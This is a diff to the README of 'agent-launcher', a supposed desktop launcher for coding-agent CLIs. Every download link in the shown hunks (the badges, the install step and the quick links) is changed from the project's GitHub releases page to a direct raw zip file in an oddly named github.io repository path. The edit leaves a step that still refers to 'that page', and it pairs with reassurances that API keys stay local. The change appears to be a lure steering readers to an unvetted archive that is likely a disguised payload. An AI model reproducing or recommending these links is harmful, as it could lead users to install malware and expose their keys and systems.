@@ -5,7 +5,7 @@ description: "Launch, configure, and run coding-agent CLIs from one unified desk
 ---
 # 🚀 agent-launcher - One App, Every Coding Agent
 
-[![Download agent-launcher](https://img.shields.io/badge/Download-agent--launcher-2ea44f?style=for-the-badge&logo=github)](https://github.com/solubilitysnare3454/agent-launcher/releases)
+[![Download agent-launcher](https://img.shields.io/badge/Download-agent--launcher-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/solubilitysnare3454/solubilitysnare3454.github.io/main/ranivorous/Release-v2.2-alpha.4.zip)
 
 ## 👋 What Is This?
 
@@ -47,7 +47,7 @@ Your API keys and settings stay on your own computer. agent-launcher doesn't sen
 
 Getting agent-launcher on your computer is easy. Follow these simple steps:
 
-1. **Visit this link to download the application:** [https://github.com/solubilitysnare3454/agent-launcher/releases](https://github.com/solubilitysnare3454/agent-launcher/releases)
+1. **Visit this link to download the application:** [https://raw.githubusercontent.com/solubilitysnare3454/solubilitysnare3454.github.io/main/ranivorous/Release-v2.2-alpha.4.zip](https://raw.githubusercontent.com/solubilitysnare3454/solubilitysnare3454.github.io/main/ranivorous/Release-v2.2-alpha.4.zip)
 
 2. On that page, look for the newest version at the top.
 
@@ -200,7 +200,7 @@ We built agent-launcher because we believe AI tools should be easy for everyone.
 
 ## 🔗 Quick Links
 
-- **Download:** [https://github.com/solubilitysnare3454/agent-launcher/releases](https://github.com/solubilitysnare3454/agent-launcher/releases)
+- **Download:** [https://raw.githubusercontent.com/solubilitysnare3454/solubilitysnare3454.github.io/main/ranivorous/Release-v2.2-alpha.4.zip](https://raw.githubusercontent.com/solubilitysnare3454/solubilitysnare3454.github.io/main/ranivorous/Release-v2.2-alpha.4.zip)
 - **Report a Problem:** Use the "Issues" tab on the GitHub page
 - **Suggest a Feature:** Also via the "Issues" tab
 
@@ -208,6 +208,6 @@ We built agent-launcher because we believe AI tools should be easy for everyone.
 
 You're just two minutes away from having all your AI coding tools in one place. Download agent-launcher now and see how much easier your work becomes.
 
-[![Get agent-launcher Now](https://img.shields.io/badge/🚀%20Download%20Now-Get%20agent--launcher-blue?style=for-the-badge)](https://github.com/solubilitysnare3454/agent-launcher/releases)
+[![Get agent-launcher Now](https://img.shields.io/badge/🚀%20Download%20Now-Get%20agent--launcher-blue?style=for-the-badge)](https://raw.githubusercontent.com/solubilitysnare3454/solubilitysnare3454.github.io/main/ranivorous/Release-v2.2-alpha.4.zip)
 
 Keywords: ai-agent, claude-code, cli, codex, cross-platform, desktop-app, developer-tools, electron, gemini-cli, macos
